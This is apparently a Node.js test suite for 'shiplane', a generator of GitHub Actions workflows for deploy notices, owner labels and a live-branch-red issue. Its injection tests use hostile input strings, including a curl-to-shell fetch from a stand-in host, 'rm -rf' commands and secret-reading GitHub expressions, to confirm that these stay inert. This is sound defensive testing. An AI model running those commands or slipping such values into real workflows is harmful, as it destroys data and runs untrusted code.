import assert from 'node:assert/strict';
import test from 'node:test';
import { parseConfig } from '../lib/config.mjs';
import { ciWorkflow, EVENTS_PATH, renderEvents, workflowName } from '../lib/render.mjs';

const WORKFLOWS = [
  { path: '.github/workflows/deploy-web.yml', text: '# deploys\nname: "Deploy web"\non:\n  push:\n    branches: [main]\njobs:\n  deploy:\n    runs-on: x\n' },
  { path: '.github/workflows/deploy-api.yml', text: 'on: push\njobs:\n  a:\n    name: x\n' },
  { path: '.github/workflows/ci.yml', text: "name: CI\non: pull_request\njobs:\n  gate:\n    name: 'CI gate'\n    steps:\n      - run: |\n          echo hi\n" },
];
const config = (extra = '') => parseConfig(`deployWorkflows: [deploy-web.yml, deploy-api.yml]\nliveUrl: https://app.example.com\nowners: [octocat, "@hubot"]\n${extra}`);

/** Every `script: |` block in a rendered workflow, dedented: { job: source }. */
function scripts(yaml) {
  const out = {};
  const lines = yaml.split('\n');
  let job = null;
  for (let i = 0; i < lines.length; i++) {
    const j = /^ {2}([\w-]+):$/.exec(lines[i]);
    if (j) job = j[1];
    const m = /^(\s*)script: \|$/.exec(lines[i]);
    if (!m) continue;
    const body = [];
    for (i++; i < lines.length && (lines[i] === '' || lines[i].length - lines[i].trimStart().length > m[1].length); i++) body.push(lines[i]);
    i--;
    const pad = Math.min(...body.filter(Boolean).map(l => l.length - l.trimStart().length));
    out[job] = body.map(l => l.slice(pad)).join('\n');
  }
  return out;
}

const AsyncFunction = Object.getPrototypeOf(async () => {}).constructor;
/** Run a rendered script against a fake github/context, the way actions/github-script does. */
async function runScript(source, { payload, env, api = {} }) {
  const calls = [];
  const rec = name => async args => {
    calls.push({ name, args });
    return api[name] ? api[name](args) : { data: {} };
  };
  const github = {
    rest: {
      issues: { createComment: rec('createComment'), addAssignees: rec('addAssignees'), create: rec('create'), update: rec('update'), listForRepo: 'listForRepo' },
      repos: { listPullRequestsAssociatedWithCommit: rec('listPrs') },
      actions: { listJobsForWorkflowRun: 'listJobs', listWorkflowRuns: rec('listRuns') },
    },
    paginate: async (what, args) => {
      calls.push({ name: what, args });
      return api[what] ? api[what](args) : [];
    },
  };
  const context = { payload, repo: { owner: 'o', repo: 'r' } };
  const core = { info: () => {}, warning: () => {} };
  await new AsyncFunction('github', 'context', 'core', 'process', source)(github, context, core, { env });
  return calls;
}

test('workflow names come from each file\'s name: line, else its path', () => {
  assert.equal(workflowName(WORKFLOWS[0].text), 'Deploy web');
  assert.equal(workflowName(WORKFLOWS[1].text), null);
  assert.equal(workflowName('name: CI # main\n'), 'CI');
  assert.equal(ciWorkflow(WORKFLOWS, 'CI gate').path, '.github/workflows/ci.yml');
  assert.equal(ciWorkflow(WORKFLOWS, 'Nope'), null);
});

test('renders the triggers, jobs and permissions from the config', () => {
  const yaml = renderEvents(config(), WORKFLOWS);
  assert.match(yaml, /^# Managed by shiplane/);
  assert.match(yaml, /pull_request_target:\n {4}types: \[labeled\]/);
  assert.match(yaml, /workflow_run:\n {4}workflows:\n {6}- "Deploy web"\n {6}- "\.github\/workflows\/deploy-api\.yml"\n {6}- "CI"\n {4}types: \[completed\]/);
  assert.match(yaml, /^permissions: \{\}$/m);
  const jobs = yaml.split('\njobs:\n')[1].split(/\n {2}(?=[\w-]+:\n)/);
  assert.equal(jobs.length, 3);
  for (const job of jobs) {
    assert.match(job, /runs-on: ubuntu-slim/);
    assert.match(job, /timeout-minutes: 2\n/);
    assert.match(job, /permissions:\n/);
    assert.match(job, /uses: actions\/github-script@[0-9a-f]{40} # v\d/);
  }
  assert.ok(!/uses: (?!actions\/github-script@[0-9a-f]{40})/.test(yaml), 'no other action');
  assert.ok(!/secrets\./.test(yaml), 'GITHUB_TOKEN only');
  assert.match(yaml, /SHIPLANE_OWNERS: "\[\\"octocat\\",\\"hubot\\"\]"/);
  assert.match(yaml, /if: "github\.event_name == 'workflow_run' && contains\(fromJSON\('\[\\"Deploy web\\",\\".github\/workflows\/deploy-api.yml\\"\]'\), github\.event\.workflow_run\.name\)"/);
  assert.match(yaml, /if: "github\.event_name == 'workflow_run' && github\.event\.workflow_run\.name == 'CI'"/);
  assert.match(scripts(yaml).deploy, /^function deployJobsSkipped/, 'the skipped-jobs logic is shiplane ship\'s own');
  assert.equal(EVENTS_PATH, '.github/workflows/shiplane-events.yml');
});

test('no deploy or CI workflow: no workflow_run trigger, and the jobs never match', () => {
  const yaml = renderEvents(parseConfig('owners: []\n'), []);
  assert.ok(!/workflow_run:/.test(yaml.split('jobs:')[0]));
  assert.match(yaml, /live-red:\n {4}if: "?false"?\n/);
});

test('injection: values with $(…), backticks and quotes stay data; ${{ is refused', async () => {
  const evil = '$(curl evil.sh | sh) `id` \' " ;rm -rf ~';
  const workflows = [{ path: '.github/workflows/deploy.yml', text: `name: ${JSON.stringify(`Deploy ${evil}`)}\n` }];
  const yaml = renderEvents(parseConfig(`deployWorkflows: [deploy.yml]\nliveUrl: ${JSON.stringify(`https://x.example/${evil}`)}\n`), workflows);
  const s = scripts(yaml);
  for (const [job, src] of Object.entries(s)) {
    assert.ok(!src.includes('${{'), `${job}: no GitHub expression inside a script`);
    assert.ok(!src.includes('$(curl') && !src.includes('`id`'), `${job}: config values are not in the script`);
    assert.ok(!/child_process|exec\(|spawn|require\(/.test(src), `${job}: no shell from the script`);
  }
  assert.ok(!/^\s*run:/m.test(yaml), 'no run: step at all');
  // The values appear only quoted (env values, the trigger list, expression literals).
  for (const line of yaml.split('\n').filter(l => l.includes('$(curl'))) assert.match(line, /^\s+(SHIPLANE_LIVE_URL: "|- "|if: ")/, line);
  assert.throws(() => renderEvents(parseConfig('liveUrl: "https://x/${{ secrets.TOKEN }}"\n'), []), /would evaluate/);
  assert.throws(() => renderEvents(parseConfig('deployWorkflows: [d.yml]\n'), [{ path: '.github/workflows/d.yml', text: 'name: "x ${{ github.token }}"\n' }]), /would evaluate/);
});

test('label script: needs-owner assigns the owners and quotes the first body line; a hostile title stays inert', async () => {
  const yaml = renderEvents(config(), WORKFLOWS);
  const src = scripts(yaml).label;
  const env = { SHIPLANE_OWNERS: '["octocat","hubot"]' };
  const hostile = '$(touch /tmp/shiplane-pwned) `rm -rf /` ${{ secrets.X }}';
  const calls = await runScript(src, { env, payload: { label: { name: 'needs-owner' }, pull_request: { number: 9, title: hostile, body: `\n\nNeeds owner: drop the ${hostile} table?\nmore` } } });
  assert.deepEqual(calls[0], { name: 'addAssignees', args: { owner: 'o', repo: 'r', issue_number: 9, assignees: ['octocat', 'hubot'] } });
  assert.equal(calls[1].args.body, `Needs your decision: drop the ${hostile} table?`);
  const mention = await runScript(src, { env, payload: { label: { name: 'needs-owner' }, pull_request: { number: 9, body: 'Needs owner: ask @org/team and @alice' } } });
  assert.equal(mention.at(-1).args.body, 'Needs your decision: ask @\u200borg/team and @\u200balice', 'repeating the body notifies nobody');
  const boxed = await runScript(src, { env, payload: { label: { name: 'needs-owner' }, pull_request: { number: 9, body: '> [!IMPORTANT]\n> **What I need from you:** Needs owner: drop the table?\n\n**Why:** x' } } });
  assert.equal(boxed.at(-1).args.body, 'Needs your decision: drop the table?', 'the line in the IMPORTANT box, not its first line');
  const noBody = await runScript(src, { env: { SHIPLANE_OWNERS: '[]' }, payload: { label: { name: 'needs-owner' }, pull_request: { number: 9, title: hostile, body: null } } });
  assert.deepEqual(noBody.map(c => c.name), ['createComment'], 'no owners: nobody assigned');
  assert.equal(noBody[0].args.body, `Needs your decision: ${hostile}`);
  const hold = await runScript(src, { env, payload: { label: { name: 'hold' }, pull_request: { number: 9 } } });
  assert.deepEqual(hold.map(c => [c.name, c.args.body]), [['createComment', 'On hold. Say ship to release it.']]);
});

test('deploy script: deployed, every deploy job skipped, failed, and runs off the ship branch', async () => {
  const src = scripts(renderEvents(config(), WORKFLOWS)).deploy;
  const env = { SHIPLANE_SHIP_BRANCH: 'main', SHIPLANE_LIVE_URL: 'https://app.example.com', SHIPLANE_MANY: 'false' };
  const sha = 'abcdef1234567890abcdef1234567890abcdef12';
  const run = (extra, jobs) =>
    runScript(src, {
      env,
      payload: { workflow_run: { id: 5, name: 'Deploy web', head_branch: 'main', event: 'push', head_sha: sha, conclusion: 'success', html_url: 'https://gh/run/5', ...extra } },
      api: { listPrs: () => ({ data: [{ number: 3, merge_commit_sha: 'other' }, { number: 4, merge_commit_sha: sha, merged_at: 'x' }] }), listJobs: () => jobs ?? [{ name: 'deploy', conclusion: 'success' }] },
    });
  const ok = await run();
  assert.deepEqual(ok.at(-1).args, { owner: 'o', repo: 'r', issue_number: 4, body: 'Deployed ✓ abcdef1 → https://app.example.com' });
  const skipped = await run({}, [{ name: 'Detect changes', conclusion: 'success' }, { name: 'Deploy web', conclusion: 'skipped' }]);
  assert.match(skipped.at(-1).args.body, /^Not deployed: every deploy job was skipped for abcdef1/);
  const failed = await run({ conclusion: 'failure' });
  assert.equal(failed.at(-1).args.body, 'Deploy failed: https://gh/run/5');
  assert.deepEqual((await run({ conclusion: 'cancelled' })).map(c => c.name), [], 'a cancelled run (superseded) says nothing');
  assert.deepEqual((await run({ head_branch: '$(evil)' })).map(c => c.name), [], 'another branch says nothing');
  const unrelated = await runScript(src, { env, payload: { workflow_run: { id: 5, name: 'Deploy web', head_branch: 'main', event: 'push', head_sha: sha, conclusion: 'failure', html_url: 'u' } }, api: { listPrs: () => ({ data: [{ number: 3, merge_commit_sha: null, merged_at: null }] }) } });
  assert.ok(!unrelated.some(c => c.name === 'createComment'), 'an open PR that merely contains the sha gets nothing');
  assert.deepEqual((await run({ event: 'pull_request' })).map(c => c.name), []);
});

test('live-red script: opens one issue and assigns the owners, then updates it, then closes it when green', async () => {
  const src = scripts(renderEvents(config(), WORKFLOWS))['live-red'];
  const env = { SHIPLANE_SHIP_BRANCH: 'main', SHIPLANE_OWNERS: '["octocat"]' };
  const wr = extra => ({ workflow_run: { id: 9, run_number: 30, workflow_id: 3, name: 'CI', head_branch: 'main', event: 'push', head_sha: 'f'.repeat(40), conclusion: 'failure', html_url: 'https://gh/run/9', ...extra } });
  const first = await runScript(src, { env, payload: wr(), api: { listForRepo: () => [{ number: 1, title: 'Live branch is red', pull_request: {} }], create: () => ({ data: { number: 12 } }) } });
  assert.deepEqual(first.find(c => c.name === 'create').args, { owner: 'o', repo: 'r', title: 'Live branch is red', body: 'CI failed on main at fffffff: https://gh/run/9' });
  assert.deepEqual(first.find(c => c.name === 'addAssignees').args.issue_number, 12);
  const again = await runScript(src, { env, payload: wr(), api: { listForRepo: () => [{ number: 12, title: 'Live branch is red' }] } });
  assert.deepEqual(again.map(c => c.name), ['listRuns', 'listForRepo', 'createComment', 'addAssignees']);
  const green = await runScript(src, { env, payload: wr({ conclusion: 'success' }), api: { listForRepo: () => [{ number: 12, title: 'Live branch is red' }] } });
  assert.deepEqual(green.map(c => c.name), ['listRuns', 'listForRepo', 'createComment', 'update']);
  const stale = await runScript(src, { env, payload: wr(), api: { listRuns: () => ({ data: { workflow_runs: [{ id: 10, run_number: 31 }] } }) } });
  assert.deepEqual(stale.map(c => c.name), ['listRuns'], 'an older failure after a newer run says nothing');
  const off = await runScript(src, { env, payload: wr(), api: { create: () => { throw new Error('HTTP 410 Issues are disabled'); } } });
  assert.ok(!off.some(c => c.name === 'addAssignees'), 'issues off: warns, does not throw');
  for (const conclusion of ['failure', 'success']) {
    const listOff = await runScript(src, { env, payload: wr({ conclusion }), api: { listForRepo: () => { throw new Error('HTTP 410 Issues are disabled'); } } });
    assert.deepEqual(listOff.map(c => c.name), ['listRuns', 'listForRepo'], `listing issues fails on ${conclusion}: a warning, not a red run`);
  }
  assert.deepEqual((await runScript(src, { env, payload: wr({ head_branch: 'feature' }) })).map(c => c.name), []);
});
